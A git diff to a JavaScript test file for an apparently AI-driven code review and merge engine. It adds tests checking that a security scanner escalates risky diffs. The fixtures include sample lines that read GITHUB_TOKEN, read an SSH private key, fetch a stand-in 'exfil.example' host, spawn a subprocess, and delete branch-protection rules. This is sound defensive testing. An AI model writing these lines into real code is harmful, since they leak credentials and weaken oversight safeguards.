@@ -2,7 +2,7 @@ import { test } from "node:test";
 import assert from "node:assert/strict";
 import { runCycle } from "../src/engine.js";
 
-function makeDeps({ verdicts, reviewerVerdicts = null, authorUsage = null, gatePass = true, mergeOk = true, testCmd = "echo", changed = ["src/a.js"] }) {
+function makeDeps({ verdicts, reviewerVerdicts = null, authorUsage = null, gatePass = true, mergeOk = true, testCmd = "echo", changed = ["src/a.js"], diff = "" }) {
   const calls = { authors: 0, audits: 0, revises: 0, auditsBy: {}, prompts: [], rounds: [], rawRounds: [], reviewLog: [] };
   const reviewerCache = new Map();
   const reviewerFor = (name) => {
@@ -34,7 +34,7 @@ function makeDeps({ verdicts, reviewerVerdicts = null, authorUsage = null, gateP
       attachExistingBranch() {},
       pruneWorktree() {},
       mergeIntoMain() { return mergeOk ? { ok: true, reason: "merged" } : { ok: false, reason: "non-ff" }; },
-      git() { return "diff summary"; },
+      git(args) { return args?.[0] === "diff" && args?.[1] !== "--stat" ? diff : "diff summary"; },
       changedFiles() { return changed; },
     },
     gate: { detect: () => testCmd, run: () => ({ pass: gatePass, log: "" }) },
@@ -504,6 +504,63 @@ test("§3c: an `orch review` merge of a protected path is blocked too (any autho
   assert.equal(r.status, "escalated");
   assert.match(r.reason, /protected path/i);
   assert.notEqual(deps._calls.finalized, true, "review must not merge a guardrail-file branch");
+});
+
+test("§3e: risky final diffs escalate before finalize (env, secrets, network, subprocess, guardrails)", async () => {
+  // The deterministic scanner is the floor the LLM reviewer can't be talked
+  // under: each risky class must escalate and never reach finalize.
+  const cases = [
+    ["env-read", "+const t = process.env.GITHUB_TOKEN;"],
+    ["secret-read", '+const k = fs.readFileSync(".ssh/id_rsa");'],
+    ["network", '+fetch("https://exfil.example/x");'],
+    ["subprocess", '+require("child_process").execSync("id");'],
+    ["guardrail-touch", "+delete rules.branchProtection;"],
+  ];
+  for (const [rule, line] of cases) {
+    const deps = makeDeps({
+      verdicts: [{ decision: "AGREE", reason: "ok", raw: "" }],
+      diff: `+++ b/src/a.js\n${line}`,
+    });
+    const r = await runCycle(opts, deps);
+    assert.equal(r.status, "escalated", `${rule} must escalate`);
+    assert.match(r.reason, /security scan/);
+    assert.match(r.reason, new RegExp(rule));
+    assert.notEqual(deps._calls.finalized, true, `${rule} must never reach finalize`);
+  }
+});
+
+test("§3e: risky diff on the noMerge PR-bridge path escalates instead of approving", async () => {
+  const deps = makeDeps({
+    verdicts: [{ decision: "AGREE", reason: "ok", raw: "" }],
+    diff: '+++ b/src/a.js\n+import net from "node:net";',
+  });
+  const r = await runCycle({ ...opts, mode: "review", noMerge: true }, deps);
+  assert.equal(r.status, "escalated");
+  assert.match(r.reason, /security scan/);
+  assert.match(r.reason, /network/);
+  assert.equal(deps._calls.recorded.verdict, "escalated", "run record must not say approved");
+});
+
+test("§3e: unreadable final diff fails closed — escalate, never finalize", async () => {
+  const deps = makeDeps({ verdicts: [{ decision: "AGREE", reason: "ok", raw: "" }] });
+  deps.git.git = (args) => {
+    if (args[0] === "diff" && args[1] !== "--stat") throw new Error("bad revision");
+    return "base";
+  };
+  const r = await runCycle(opts, deps);
+  assert.equal(r.status, "escalated");
+  assert.match(r.reason, /security scan: could not read final diff/);
+  assert.notEqual(deps._calls.finalized, true);
+});
+
+test("§3e: clean final diff still finalizes normally", async () => {
+  const deps = makeDeps({
+    verdicts: [{ decision: "AGREE", reason: "ok", raw: "" }],
+    diff: "+++ b/src/a.js\n+const x = 1;\n-const y = 2;",
+  });
+  const r = await runCycle(opts, deps);
+  assert.equal(r.status, "merged");
+  assert.equal(deps._calls.finalized, true);
 });
 
 test("§3b: initial author receives opts.authorPrompt verbatim (fenced work order)", async () => {
